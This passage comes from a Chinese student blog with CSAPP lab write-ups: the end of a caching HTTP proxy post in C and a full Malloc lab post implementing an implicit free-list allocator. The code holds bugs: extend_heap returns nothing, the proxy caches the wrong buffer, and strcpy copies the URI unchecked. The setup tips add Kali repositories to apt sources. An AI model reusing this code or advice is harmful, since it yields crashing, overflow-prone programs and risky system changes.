class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);       <span class="comment">//解析请求行</span></span><br><span class="line">   	<span class="built_in">strcpy</span>(cache_tag,uri);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;                     <span class="comment">//是否为GET请求</span></span><br><span class="line">        clienterror(fd, method, <span class="string">&quot;501&quot;</span>, <span class="string">&quot;Not Implemented&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Tiny does not implement this method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;                                                    </span><br><span class="line">    read_requesthdrs(&amp;rio);    <span class="comment">//显示请求行和头（printf）</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uri是否存在缓存中</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> ((i = get_Cache(cache_tag)) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//加锁</span></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt++;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">1</span>)</span><br><span class="line">            P(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line"></span><br><span class="line">        Rio_writen(connfd, cache.data[i].obj, <span class="built_in">strlen</span>(cache.data[i].obj));</span><br><span class="line"></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt--;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">0</span>)</span><br><span class="line">            V(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析uri为host port path</span></span><br><span class="line">    parse_uri(uri);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改写</span></span><br><span class="line">    <span class="built_in">sprintf</span>(newhd, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, send_path);</span><br><span class="line">    send = built_message(newhd,&amp;rio);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开启远程服务器</span></span><br><span class="line">    <span class="keyword">int</span> serverfd = Open_clientfd(send_host,send_port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    Rio_readinitb(&amp;serverfd_rio, serverfd);</span><br><span class="line">    <span class="comment">//写入服务器</span></span><br><span class="line">    Rio_writen(serverfd, send, <span class="built_in">strlen</span>(send));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cache_buf[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="keyword">int</span> size_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回响</span></span><br><span class="line">    <span class="keyword">while</span>((n = Rio_readlineb(&amp;serverfd_rio,backbuf,MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        size_buf += n;</span><br><span class="line">        <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)</span><br><span class="line">            <span class="built_in">strcat</span>(cache_buf, buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="keyword">int</span>)n);</span><br><span class="line">        Rio_writen(fd,backbuf,n);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Close (serverfd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//没有就写入缓存</span></span><br><span class="line">    <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)&#123;</span><br><span class="line">        write_Cache(cache_tag, cache_buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然迷迷糊糊的，但跟着线程走了一遍，多多少少学会了更多的东西：比如信号量的运用，线程创建和运作方式，以及状态机和模型的特点；但这个lab确实感受到了难度，等往后学的深入再返回看的话应该还会有收获；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/10/01/Proxy-lab/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/09/11/Malloc-Lab/">Malloc_Lab</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/CSAPP/">CSAPP</a></div></div><div class="post-content"><div class="main-content content"><p><img src="https://s2.loli.net/2022/09/12/nTyIcwFaqgRKWh1.jpg" alt="forest"></p>
<hr>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>一个动态内存申请器，能实现：malloc， free， realloc；</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>CSAPP第9章：动态内存申请器，内存中的堆，链表；</p>
<h2 id="蛋疼的检测工具"><a href="#蛋疼的检测工具" class="headerlink" title="蛋疼的检测工具"></a>蛋疼的检测工具</h2><p>首先需要；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -O2 -m32   -c -o mdriver.o mdriver.c</span><br></pre></td></tr></table></figure>

<p>然后；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make mdriver mdriver.o mm.o memlib.o fsecs.o fcyc.o clock.o ftimer.o</span><br></pre></td></tr></table></figure>

<p>以上两个出错请用下面指令解决；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>

<p>下载出错请更新镜像，或者添加清华园下载路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

<p>输入以下命令打开下载源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>按 i 进入编辑模式，完成后输入 :w 保存， :q退出；之后输入一遍：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<p>然后就能输入第三条指令了，接着编译就行了；</p>
<p>其次，traces是缺失的，需要下载以进行检测；地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Davon-Feng/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces">https://github.com/Davon-Feng/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces</a></p>
<p>将10个文件装入文件夹，将文件夹放到和 mdriver 同级的地方；</p>
<p>并修改config.h里第15行的内容为自己的traces文件夹目录；</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
<li>需要内存空间模拟堆；</li>
<li>需要模拟已分配和未分配的块；</li>
<li>需要管理这个空间（开始，结束，填充）；</li>
<li>需要操控这个空间（放置，分割，合并，释放）；</li>
</ul>
<h2 id="已知内容"><a href="#已知内容" class="headerlink" title="已知内容"></a>已知内容</h2><p>mem_heap，mem_brk两个指针分别指向堆的开始和结尾，mem_sbrk函数可以调节brk并返回旧brk的值，两个指针已初始化相等；</p>
<p>堆中的最小单位为4字节（1字），第一个字是双字边界对齐不使用的填充字；后面跟着两字的序言块，分配器使用私有的全局变量 heap_listp 指向序言块的第二个字开头；以一个0内容的已分配块作为结束的一个字；</p>
<p>使用隐式空闲链表，下一次适配，边界标记的堆块格式（最小4字，开头和结尾2字是标志字），立即合并；</p>
<p>标志字由整个块的大小或上分配位组成；</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="I-操作空闲链表的常数和宏"><a href="#I-操作空闲链表的常数和宏" class="headerlink" title="I . 操作空闲链表的常数和宏"></a>I . 操作空闲链表的常数和宏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE 4     <span class="comment">//一字的字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE 8     <span class="comment">//两字的字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE (1&lt;&lt;12)       <span class="comment">//延展一次堆的字节数</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x,y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN(x,y) ((x) &lt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大小或上分配位打包的标志字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size,alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读写p指针处的一个字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p) (*(unsigned int *)(p))       </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p,val) (*(unsigned int *)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取标志字中的大小和分配状态</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给出开头或结尾标志字的位置(bp指针指向块的有效载体)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp) ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp) ((char *)(bp) - DSIZE + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给出前一个或下一个块的bp指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE((char *)(bp) - DSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * heap_listp;</span><br><span class="line"><span class="comment">//下次适配记录之前的块</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> * prev_listp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>p是一个void * 指针，所以强制转换是必要的；</p>
<h3 id="II-创建空闲列表（堆）"><a href="#II-创建空闲列表（堆）" class="headerlink" title="II . 创建空闲列表（堆）"></a>II . 创建空闲列表（堆）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">//分配4个字(1个初始填充，2个序言，1个结尾)</span></span><br><span class="line">    <span class="keyword">if</span>((heap_listp = mem_sbrk(<span class="number">4</span>*WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp,<span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + WSIZE,PACK(DSIZE,<span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + (<span class="number">2</span> * WSIZE),PACK(DSIZE,<span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + (<span class="number">3</span>*WSIZE),PACK(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">    heap_listp += (<span class="number">2</span>*WSIZE);</span><br><span class="line">    prev_listp = heap_listp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//延展空闲块</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> * <span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//满足2字对齐</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置填充空闲块的头和尾，以及延展一个结束字</span></span><br><span class="line">    PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)),PACK(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并空闲块，如果前面是的话</span></span><br><span class="line">    prev_listp = coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mm_init函数在创建初始堆空间；extend_heap函数在延展空闲块，用在init里，当然也可以用在当申请空间不足时的地方，所以单独成为一个函数；coalesce之后会讲到，是合并空闲块的函数，在填充和释放时用到；</p>
<p>注意，首次适配所记录的当前块指针如果被向前合并，则记录指针也需要随之改变，所以最好运用合并函数的地方都使其返回的值成为prev_listp；</p>
<h3 id="III-释放和合并块"><a href="#III-释放和合并块" class="headerlink" title="III . 释放和合并块"></a>III . 释放和合并块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> * bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置头尾分配位0</span></span><br><span class="line">    PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    prev_listp = coalesce(bp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4种情况，前后块都是分配的，前后块都没分配，前后块有一者分配</span></span><br><span class="line">    <span class="keyword">if</span>(prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">    &#123;	</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">	&#125;    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)</span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(size,<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp))) + GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)),PACK(size,<span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在第二个else if 的地方，HDRP需要写前面，因为FTRP会用HDRP处的内容；</p>
<h3 id="IV-放置和分割块"><a href="#IV-放置和分割块" class="headerlink" title="IV . 放置和分割块"></a>IV . 放置和分割块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 调整后大小</span></span><br><span class="line">    <span class="keyword">size_t</span> asize;</span><br><span class="line">    <span class="comment">//延展大小</span></span><br><span class="line">    <span class="keyword">size_t</span> extendsize;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//忽视无用请求</span></span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调整对齐要求</span></span><br><span class="line">    <span class="keyword">if</span>(size &lt;= DSIZE)</span><br><span class="line">        asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">//向上取整</span></span><br><span class="line">        asize = ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE) * DSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//放置块</span></span><br><span class="line">    <span class="keyword">if</span>((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp,asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空间不够延展</span></span><br><span class="line">    extendsize = MAX(asize,CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span>((bp = extend_heap(extendsize/WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp,asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * bp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//初始化使prev_listp指向了序言块</span></span><br><span class="line">    <span class="keyword">for</span>(bp = prev_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp))))</span><br><span class="line">        &#123;</span><br><span class="line">            prev_listp = bp;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//后面找没有之后从头找</span></span><br><span class="line">    <span class="keyword">for</span>(bp = heap_listp; bp != prev_listp; bp = NEXT_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp))))</span><br><span class="line">        &#123;</span><br><span class="line">            prev_listp = bp;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> * bp,<span class="keyword">size_t</span> asize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//原块长度</span></span><br><span class="line">    <span class="keyword">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分割后大小大于或等于最小块则执行分割</span></span><br><span class="line">    <span class="keyword">if</span>((csize - asize) &gt;= (<span class="number">2</span> * DSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(asize,<span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp),PACK((csize - asize),<span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK((csize - asize),<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(HDRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp),PACK(csize,<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="V-重分配块大小"><a href="#V-重分配块大小" class="headerlink" title="V . 重分配块大小"></a>V . 重分配块大小</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_realloc</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> * old_bp = bp;</span><br><span class="line">    <span class="keyword">void</span> * new_bp;</span><br><span class="line">    <span class="keyword">size_t</span> oldsize, newsize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建新的分配块</span></span><br><span class="line">    new_bp = mm_malloc(size);</span><br><span class="line">    <span class="keyword">if</span>(new_bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    oldsize = GET_SIZE(HDRP(old_bp));</span><br><span class="line">    newsize = GET_SIZE(HDRP(new_bp));</span><br><span class="line">    <span class="comment">//比较新旧大小，如果新的更大，则复制原数据过去，如果更小，复制小的长度个原数据</span></span><br><span class="line">    <span class="keyword">if</span>(oldsize &lt; newsize)</span><br><span class="line">        newsize = oldsize;</span><br><span class="line">    <span class="comment">//取消结尾字</span></span><br><span class="line">    <span class="built_in">memcpy</span>(new_bp, old_bp, newsize-WSIZE);</span><br><span class="line">    mm_free(old_bp);</span><br><span class="line">    <span class="keyword">return</span> new_bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="VI-检测"><a href="#VI-检测" class="headerlink" title="VI . 检测"></a>VI . 检测</h3><p>将代码打包到mm.c，使用之前的编译命令，搞出有代码的 mdriver；输入以检测：</p>
